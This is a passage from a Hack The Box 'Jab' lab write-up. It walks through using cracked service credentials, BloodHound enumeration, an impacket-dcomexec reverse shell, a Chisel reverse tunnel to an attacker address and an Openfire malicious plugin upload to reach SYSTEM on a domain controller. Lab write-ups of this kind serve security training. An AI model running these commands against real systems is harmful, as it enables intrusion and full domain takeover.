 ![](/assets/images/HTB-Writeup-Jab/Pasted image 20240609204642.png)
- Inside this new room, _pentest2003_, there's a conversation among a team of pentesters, presumably. It seems that the user `bdavis` managed to crack the hash derived from the Service Ticket belonging to the SPN `svc_openfire`.

 ![](/assets/images/HTB-Writeup-Jab/Pasted image 20240609205036.png)

- The pentester verified that these credentials (`svc_openfire`: `!@#$%^&*(1qazxsw`) are still valid using `crackmapexec`.

![](/assets/images/HTB-Writeup-Jab/Pasted image 20240609210722.png)

- Enumeration is an iterative process, and now that we have a new set of credentials (`svc_openfire`: `!@#$%^&*(1qazxsw`), he re-enumerated the SMB and WinRM services, but didn't find anything interesting.

![](/assets/images/HTB-Writeup-Jab/Pasted image 20240609222432.png)

- Since we have valid credentials for a domain user, we'll use `bloodhound-python`, a Python-based ingestor for BloodHound, to extract domain information for further analysis.

```bash
bloodhound-python -u 'svc_openfire' -p '!@#$%^&*(1qazxsw' -d jab.htb -c all -ns 10.10.11.4
```

![](/assets/images/HTB-Writeup-Jab/Pasted image 20240613103324.png)

- Afterward, we'll compress all the files into a `zip` file to upload them to BloodHound.

```bash
zip jab_ad.zip *
```

![](/assets/images/HTB-Writeup-Jab/Pasted image 20240613103517.png)

![](/assets/images/HTB-Writeup-Jab/Pasted image 20240613103923.png)

## Foothold

- Once the `json` files are uploaded, the domain is enumerated. Using the query `Find Shortest Paths to Domain Admins` from the `Pre-Built Analytics Queries`, the pentester notices that the user `SVC_OPENFIRE`, for whom we have credentials, has membership in the `Distributed COM Users` local group. Generally, this can allow code execution under certain conditions by instantiating a COM object on a remote machine and invoking its methods.

![](/assets/images/HTB-Writeup-Jab/Pasted image 20240613104543.png)

- To exploit the privileges of this membership, we'll use `impacket-dcomexec`, which executes an arbitrary command and writes the output to a `share` via `SMB` by default. We'll generate the payload to obtain a reverse shell.

![](/assets/images/HTB-Writeup-Jab/Pasted image 20240609220727.png)


- With that done, we execute the following command and receive the reverse shell!

```bash
impacket-dcomexec  -object MMC20 jab.htb/svc_openfire:'!@#$%^&*(1qazxsw'@10.10.11.4 'cmd /c "powershell -e <payload_base64_here>"' -nooutput
```

![](/assets/images/HTB-Writeup-Jab/Pasted image 20240609222339.png)

> Comments: Since it's necessary to have write permissions on the SMB service to retrieve the output of the command executed by `impacket-dcomexec`, we'll use the flag `-nooutput`, which simply executes the command. [Source ](https://pentest.party/notes/lateral-movement/dcom)
{: .prompt-info }

## User
- Reading `user.txt`

![](/assets/images/HTB-Writeup-Jab/Pasted image 20240613144449.png)

## Root
- After performing a deep enumeration on the host, it's observed that there are uncommon processes such as `openfire-service`. The pentester was previously interested in this `openfire-service` due to an `nmap` scan indicating a version of `3.10.0` or later. This interest stems from a quick vulnerability search, revealing the existence of the [`Openfire authentication bypass with RCE plugin: CVE-2023-32315`](https://www.rapid7.com/db/modules/exploit/multi/http/openfire_auth_bypass_rce_cve_2023_32315/).

![](/assets/images/HTB-Writeup-Jab/Pasted image 20240613115049.png)

- Since it's running internally, he used Chisel to perform a Reverse Pivot and gain access to the internal service. So, he first uploaded the executable `chisel_windows_amd64.exe` to the target host.

![](/assets/images/HTB-Writeup-Jab/Pasted image 20240609223512.png)

- It's worth noting that the default ports for the Openfire service are `9090` and `9091` ([Source](https://wiki.archlinux.org/title/Openfire#:~:text=password'%3B%20%3E%20quit%3B-,Install%20%26%20start%20Openfire%20on%20remote,of%20your%20server%20by%20default.)). Then, he established the reverse port forwarding with the following commands.

```bash
chisel server -p 8050 --reverse
./chisel.exe client 10.10.14.151:8050 R:9090:127.0.0.1:9090 R:9091:127.0.0.1:9091
```

![](/assets/images/HTB-Writeup-Jab/Pasted image 20240613112503.png)

- He managed to access the Openfire service and noticed that it's version `4.7.5`. The [`CVE-2023-32315`](https://github.com/miko550/CVE-2023-32315) essentially involves a vulnerability in Openfire version `3.10.0` that allowed an unauthenticated user to access restricted pages in the Openfire Admin Console reserved for administrative users, and then a weaponized plugin with a Java native payload could be uploaded to trigger an RCE. This vulnerability was patched in version `4.7.5`. However, even though our version may not be vulnerable to unauthorized access, the pentester confirmed that he was able to access with the credentials `svc_openfire`:`!@#$%^&*(1qazxsw` with administrator privileges.


![](/assets/images/HTB-Writeup-Jab/Pasted image 20240609230652.png)

- After accessing as `svc_openfire`, the only thing left is to upload the malicious plugin. Since this service runs as `NT Authority\System`, we have full control over the Domain Controller.


![](/assets/images/HTB-Writeup-Jab/Pasted image 20240609233626.png)

![](/assets/images/HTB-Writeup-Jab/Pasted image 20240609233725.png)

- Reading `root.txt`!

![](/assets/images/HTB-Writeup-Jab/Pasted image 20240609234910.png)


>I hope you had as much fun reading this write up as I did writing it. If this writeup helped you, please feel free to go to my [`Hack The Box profile (xpnt)`](https://app.hackthebox.com/users/1504363) and give me a respect 😁. Happy Hacking!!👾
{: .prompt-tip }